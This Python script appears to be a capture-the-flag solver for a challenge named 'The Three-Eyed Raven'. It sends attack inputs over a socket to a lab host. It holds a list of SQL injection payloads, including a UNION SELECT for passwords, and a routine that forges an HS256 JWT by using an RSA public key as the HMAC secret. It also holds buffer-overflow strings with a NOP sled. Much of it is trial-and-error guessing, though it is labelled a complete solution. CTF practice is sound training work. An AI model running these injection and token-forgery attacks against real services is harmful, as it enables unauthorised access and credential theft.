#!/usr/bin/env python3
"""
The Three-Eyed Raven - Complete Solution
Create all three required tokens based on previous challenge solutions
"""

import socket
import time
import base64
import json
import jwt
import hmac
import hashlib

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def create_iron_bank_token():
    """Create Iron Bank SQL injection token"""
    # The hint says "walks through quote marks" - this suggests SQL injection
    # From previous challenges, we know SQL injection patterns
    
    # Common SQL injection payloads that "walk through quote marks"
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT password FROM users--",
        "' OR 'x'='x",
        "admin'--",
        "' OR ''='",
        "1' OR '1'='1' --",
        "' OR 1=1#",
        "' OR 'a'='a",
        "' OR true--",
    ]
    
    return sql_payloads

def create_face_jwt():
    """Create Face JWT using algorithm confusion attack"""
    # We have the public key from the guest response
    public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxDMF6NQqrfTvBjycUjDf
lFKDb3qiVRY8V2EIJ1ypsyTZkOT3nam91SD3tvrK6lt7hdbb+P6MpHZvXKARYs7O
PX9MqySMzYst1sWB3iW85/58qwBEQY1xM5hAJiY4U5TeoKwZupImzNxb9WldzEWW
TdNRH224fLAwIjya0eb8u2g1QCMtrmsvby5hIf7HEpyOk4ueO4VOxFujO86nP+zH
uwIPQH4TakwbAjWyX37MVAKMU9P/jwAWPjTMwpw31jELH5GdQXOHiI0bLMKht/V3
6s7vdsQaNvX9SMQqREDeDgpQ1O5Bfsj7IyjhrQR99dCfhQywhfGB61otZ3hZp3lM
aQIDAQAB
-----END PUBLIC KEY-----"""
    
    # Use the public key as HMAC secret (algorithm confusion attack)
    key = (public_key_pem + '\n').encode()
    
    # Create JWT with HS256 and name="many-faced"
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"name": "many-faced", "iat": int(time.time())}
    
    # Encode header and payload
    h = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    p = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    # Create signature
    signing_input = h + b'.' + p
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
    
    # Combine into JWT
    face_jwt = (signing_input + b'.' + sig_b64).decode()
    
    return face_jwt

def create_dragon_breath():
    """Create dragon breath - buffer overflow payload"""
    # The description says "overflow the weirwood heart's vision"
    # This suggests a buffer overflow payload
    
    # Common buffer overflow patterns
    overflow_payloads = [
        b"A" * 100,  # Simple overflow
        b"A" * 256,  # Larger overflow
        b"A" * 512,  # Even larger
        b"\x41" * 64 + b"\x42" * 8,  # Pattern with different chars
        b"AAAA" + b"BBBB" + b"CCCC" + b"DDDD",  # Pattern
        b"\x90" * 100,  # NOP sled
        b"dracarys" + b"A" * 100,  # Dragon word + overflow
        b"fire_and_blood_dracarys" + b"A" * 100,  # Flag hint + overflow
    ]
    
    # Encode as base64
    b64_payloads = []
    for payload in overflow_payloads:
        b64_payloads.append(base64.b64encode(payload).decode())
    
    return b64_payloads

def test_all_tokens():
    """Test all token combinations"""
    print("[+] Creating and testing all tokens...")
    
    # Create tokens
    iron_tokens = create_iron_bank_token()
    face_jwt = create_face_jwt()
    dragon_tokens = create_dragon_breath()
    
    print(f"[+] Created Face JWT: {face_jwt[:50]}...")
    print(f"[+] Created {len(iron_tokens)} iron tokens")
    print(f"[+] Created {len(dragon_tokens)} dragon tokens")
    
    # Test iron tokens first
    for iron_token in iron_tokens:
        try:
            print(f"\n[+] Testing iron token: {iron_token}")
            
            s = connect_to_raven()
            
            s.sendall(f"offer iron {iron_token}\n".encode())
            time.sleep(1)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            print(f"Iron response: {response.strip()}")
            
            if "accepted" in response.lower() or "raven sees" not in response:
                print("[!] Iron token might be accepted!")
                
                # Check status
                s.sendall(b"status\n")
                time.sleep(0.5)
                status = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Status: {status}")
                
                if "accepted" in status:
                    print("[!] Iron token ACCEPTED!")
                    # Continue with face JWT
                    test_face_and_dragon(s, face_jwt, dragon_tokens)
                    s.close()
                    return True
            
            s.close()
            
        except Exception as e:
            print(f"Error with iron token '{iron_token}': {e}")
    
    # If no iron token worked, try face JWT anyway
    print("\n[+] Testing face JWT...")
    try:
        s = connect_to_raven()
        
        s.sendall(f"offer face {face_jwt}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Face response: {response.strip()}")
        
        s.close()
        
    except Exception as e:
        print(f"Error with face JWT: {e}")
    
    # Test dragon tokens
    print("\n[+] Testing dragon tokens...")
    for i, dragon_token in enumerate(dragon_tokens):
        try:
            print(f"[+] Testing dragon token {i+1}/{len(dragon_tokens)}")
            
            s = connect_to_raven()
            
            s.sendall(f"offer dragon {dragon_token}\n".encode())
            time.sleep(1)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            
            if "accepted" in response.lower() or "turns away" not in response:
                print(f"Dragon response: {response.strip()}")
                print("[!] Dragon token might be accepted!")
            
            s.close()
            
        except Exception as e:
            print(f"Error with dragon token {i+1}: {e}")
    
    return False

def test_face_and_dragon(s, face_jwt, dragon_tokens):
    """Test face JWT and dragon tokens on an existing connection"""
    try:
        # Test face JWT
        print(f"[+] Testing face JWT on existing connection...")
        s.sendall(f"offer face {face_jwt}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Face response: {response.strip()}")
        
        # Check status
        s.sendall(b"status\n")
        time.sleep(0.5)
        status = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"Status after face: {status}")
        
        # Test dragon tokens
        for i, dragon_token in enumerate(dragon_tokens[:3]):  # Test first 3
            print(f"[+] Testing dragon token {i+1}...")
            s.sendall(f"offer dragon {dragon_token}\n".encode())
            time.sleep(1)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            print(f"Dragon response: {response.strip()}")
            
            # Check status after each dragon attempt
            s.sendall(b"status\n")
            time.sleep(0.5)
            status = s.recv(4096).decode('utf-8', errors='ignore')
            print(f"Status: {status}")
            
            if "SpaceCTF{" in status or "SpaceCTF{" in response:
                print("🎉 FLAG FOUND!")
                return True
        
    except Exception as e:
        print(f"Error in face/dragon test: {e}")
    
    return False

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - COMPLETE SOLUTION")
    print("="*70)
    
    if test_all_tokens():
        print("\n🎉 Challenge completed!")
    else:
        print("\n❌ Challenge not completed - need to refine tokens")

if __name__ == "__main__":
    main()